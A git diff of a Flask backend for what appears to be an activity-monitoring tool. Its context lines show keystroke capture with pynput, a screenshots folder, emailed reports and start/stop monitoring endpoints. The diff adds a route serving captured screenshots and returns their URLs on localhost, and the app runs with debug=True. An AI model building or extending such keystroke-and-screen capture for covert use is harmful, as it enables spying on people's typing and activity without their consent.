@@ -7,15 +7,13 @@ import psycopg2
 import pynput
 from pynput.keyboard import Listener
 from dotenv import load_dotenv
-from flask import Flask, jsonify
 from flask_cors import CORS
 from email.message import EmailMessage
 import mimetypes
-from flask import Flask, request, jsonify
-# from clerk_backend_api import Clerk
+from flask import Flask, request, jsonify, send_from_directory
 import requests
 import jwt
-from flask import Flask, request, jsonify
+
 
 CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
 CLERK_API_URL = "https://api.clerk.dev/v1"
@@ -122,6 +120,12 @@ def send_email_report():
         print(f"❌ Email Error: {e}")
 
 
+# Serve screenshot images from the screenshots folder
+@app.route('/screenshots/<filename>')
+def get_screenshot(filename):
+    return send_from_directory(SCREENSHOT_FOLDER, filename)
+
+
 ### **🖥 Background Monitoring Task**
 def monitor_activity():
     global monitoring, keylog_listener
@@ -183,7 +187,8 @@ def start_monitoring():
 
     return jsonify({'message': 'Monitoring started'}), 200
 
-
+    
+    
 @app.route('/get_logs', methods=['GET'])
 def get_logs():
     try:
@@ -197,7 +202,7 @@ def get_logs():
         # Get list of screenshots
         screenshots = []
         if os.path.exists(SCREENSHOT_FOLDER):
-            screenshots = os.listdir(SCREENSHOT_FOLDER)
+            screenshots = [f"http://127.0.0.1:5000/screenshots/{img}" for img in sorted(os.listdir(SCREENSHOT_FOLDER)) if img.endswith(".png")]
 
         return jsonify({"keystrokes": keystrokes, "screenshots": screenshots})
 
@@ -218,5 +223,5 @@ def stop_monitoring():
 
 
 if __name__ == "__main__":
-    ensure_directories()  # Ensure everything is set up before running
+    ensure_directories()
     app.run(debug=True)
